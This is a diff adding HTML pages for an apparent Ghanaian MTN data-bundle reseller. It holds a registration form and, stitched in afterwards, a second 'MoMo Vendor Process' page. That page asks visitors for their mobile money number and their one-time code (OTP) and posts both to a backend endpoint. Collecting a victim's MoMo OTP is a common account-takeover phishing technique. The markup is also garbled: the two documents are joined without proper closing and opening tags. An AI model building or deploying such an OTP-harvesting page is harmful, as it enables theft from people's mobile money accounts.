@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Element Data Plus - Register</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
+body{
+  background: #FFD700;
+  background: linear-gradient(135deg, #FFEB3B 0%, #FFC107 100%);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+.card{
+  background:white;
+  max-width:1050px;
+  width:100%;
+  border-radius:20px;
+  overflow:hidden;
+  display:flex;
+  box-shadow:0 20px 60px rgba(0,0,0,0.2);
+}
+.left{
+  background:#0B1C33;
+  color:white;
+  width:45%;
+  padding:40px;
+  position:relative;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+}
+.left h1{font-size:32px;line-height:1.1;font-weight:800;color:#FFD700}
+.left h1 span{color:white}
+.left p{margin:20px 0;color:#cbd5e1;font-size:14px}
+.feature{margin:10px 0;display:flex;align-items:center;gap:10px;font-size:13px}
+.feature i{background:#FFD700;color:#0B1C33;width:28px;height:28px;border-radius:50%;display:grid;place-items:center;font-style:normal;font-weight:800}
+.badge{position:absolute;top:20px;left:20px;background:#FFD700;color:#0B1C33;padding:5px 12px;border-radius:20px;font-size:11px;font-weight:700}
+.right{width:55%;padding:35px 40px}
+.right h2{font-size:26px;color:#0B1C33}
+.right .sub{color:#64748b;font-size:13px;margin:5px 0 20px}
+label{font-size:12px;font-weight:600;color:#0B1C33;margin:12px 0 5px;display:block}
+input{
+  width:100%;padding:13px 15px;border:2px solid #e2e8f0;border-radius:10px;
+  outline:none;transition:0.3s;font-size:14px;background:#f8fafc
+}
+input:focus{border-color:#FFC107;background:white;box-shadow:0 0 0 4px rgba(255,193,7,0.2)}
+.row{display:flex;gap:12px}
+.row div{flex:1}
+.btn{
+  width:100%;background:#0B1C33;color:#FFD700;border:none;padding:14px;
+  border-radius:10px;font-weight:700;font-size:15px;margin-top:20px;
+  cursor:pointer;transition:0.3s
+}
+.btn:hover{background:black;transform:translateY(-2px)}
+.terms{font-size:11px;color:#64748b;margin-top:15px;text-align:center}
+.terms a{color:#0B1C33;font-weight:600;text-decoration:none}
+.login{text-align:center;margin-top:18px;font-size:13px}
+.login a{color:#0B1C33;font-weight:700;text-decoration:none}
+.whatsapp{
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  background:#25D366;color:white;padding:10px;border-radius:10px;
+  font-weight:600;font-size:13px;margin-top:15px;text-decoration:none
+}
+@media(max-width:800px){.card{flex-direction:column}.left,.right{width:100%}}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <!-- LEFT SIDE - BUSINESS BRANDING -->
+  <div class="left">
+    <div class="badge">⚡ INSTANT • RELIABLE • 24/7</div>
+    <h1>Element<br>Data Plus<br><span>MTN DATA HUB</span></h1>
+    <p>Your Trusted Data Hub. Get up to <b style="color:#FFD700">50GB for GH₵130</b>. Affordable bundles delivered instantly to your number.</p><br>
+    <a href="Bus.htmml">Visit my other Bus</a>
+   
+    <div class="feature"><i>✓</i> 1GB - GH₵7 to 50GB - GH₵130</div>
+    <div class="feature"><i>✓</i> Valid for 30 Days • No Expiry Tricks</div>
+    <div class="feature"><i>✓</i> Instant Delivery After Payment</div>
+    <div class="feature"><i>✓</i> Support: 0530267367</div>
+
+    <div style="margin-top:25px;font-size:12px;opacity:0.7">Terms: Safe & Trusted • Fastest in Ghana</div>
+  </div>
+
+  <!-- RIGHT SIDE - REGISTER FORM -->
+  <div class="right">
+    <h2>Create Account</h2>
+    <p class="sub">Please fill this form to get access to Element Data Plus Web</p>
+
+    <form action="#" method="POST">
+      <div class="row">
+        <div>
+          <label>Full Name</label>
+          <input type="text" placeholder="Enter Full Name" required>
+        </div>
+        <div>
+          <label>Phone Number (MTN)</label>
+          <input type="tel" placeholder="0530..." required>
+        </div>
+      </div>
+
+      <label>Email Address</label>
+      <input type="email" placeholder="Enter Email" required>
+
+      <div class="row">
+        <div>
+          <label>Password</label>
+          <input type="password" placeholder="Create Password" required>
+        </div>
+        <div>
+          <label>Repeat Password</label>
+          <input type="password" placeholder="Repeat Password" required>
+        </div>
+      </div>
+
+      <label>Date of Birth</label>
+      <input type="date" required>
+
+      <button class="btn" type="submit">REGISTER NOW →</button>
+
+      <p class="terms">By creating an account you agree to our <a href="#">Terms & Privacy</a></p>
+     
+      <a class="whatsapp" href="https://wa.me/233530267367" target="_blank">💬 Chat us on WhatsApp: 0530267367</a>
+
+      <p class="login">Already have an account? <a href="#">Sign In</a></p>
+    </form>
+  </div>
+</div>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>MoMo Vendor Process</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h2 {
+            text-align: center;
+        }
+        label {
+            display: block;
+            margin-top: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            margin-top: 15px;
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .message {
+            margin-top: 15px;
+            text-align: center;
+            color: green;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>MoMo Vendor Process</h2>
+
+    <!-- Step 1: Ask for MoMo Number -->
+    <label for="momoNumber">Enter MoMo Number:</label>
+    <input type="tel" id="momoNumber" placeholder="e.g. 0241234567" required>
+
+    <!-- Step 2: Ask for MoMo Code -->
+    <label for="momoCode">Enter MoMo Code (OTP):</label>
+    <input type="text" id="momoCode" placeholder="e.g. 123456" required>
+
+    <button id="submitBtn">Continue</button>
+
+    <div class="message" id="message"></div>
+</div>
+
+<script>
+document.getElementById('submitBtn').addEventListener('click', function () {
+    const momoNumber = document.getElementById('momoNumber').value.trim();
+    const momoCode = document.getElementById('momoCode').value.trim();
+
+    // Basic validation
+    if (!momoNumber.match(/^\d{10}$/)) {
+        alert("Please enter a valid 10-digit MoMo number.");
+        return;
+    }
+    if (!momoCode.match(/^\d{4,6}$/)) {
+        alert("Please enter a valid MoMo code (4-6 digits).");
+        return;
+    }
+
+    // Send to backend for processing
+    fetch('/process-momo', { // <-- Your backend endpoint
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ momoNumber, momoCode })
+    })
+    .then(response => response.json())
+    .then(data => {
+        document.getElementById('message').textContent = data.message || "Request processed successfully.";
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        document.getElementById('message').textContent = "An error occurred. Please try again.";
+    });
+});
+</script>
+
+
+</body>
+</html>
